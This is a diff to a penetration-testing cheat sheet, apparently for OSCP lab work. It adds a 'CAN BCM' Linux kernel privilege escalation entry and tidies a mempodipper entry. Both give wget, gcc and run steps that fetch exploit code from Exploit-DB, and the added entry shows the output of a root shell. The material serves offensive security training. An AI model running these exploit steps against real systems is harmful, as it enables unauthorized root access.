@@ -1331,6 +1331,16 @@ Privilege Escalation
 
 Handy exploits:
 
+-   Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Privilege Escalation
+    [https://www.exploit-db.com/exploits/14814/](https://www.exploit-db.com/exploits/14814/)
+    
+         wget -O i-can-haz-modharden.c http://www.exploit-db.com/download/14814
+         $ gcc i-can-haz-modharden.c -o i-can-haz-modharden
+         $ ./i-can-haz-modharden
+         [+] launching root shell!
+         # id
+         uid=0(root) gid=0(root)
+
 -   CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8  
     [*https://www.exploit-db.com/exploits/15285/*](https://www.exploit-db.com/exploits/15285/)
 
@@ -1339,7 +1349,7 @@ Handy exploits:
     Linux CVE 2012-0056  
     ** Its almost always worth trying this one on an OSCP lab server **
     
-          wget -O exploit.c <http://www.exploit-db.com/download/18411>  
+          wget -O exploit.c http://www.exploit-db.com/download/18411 
           gcc -o mempodipper exploit.c  
           ./mempodipper
 
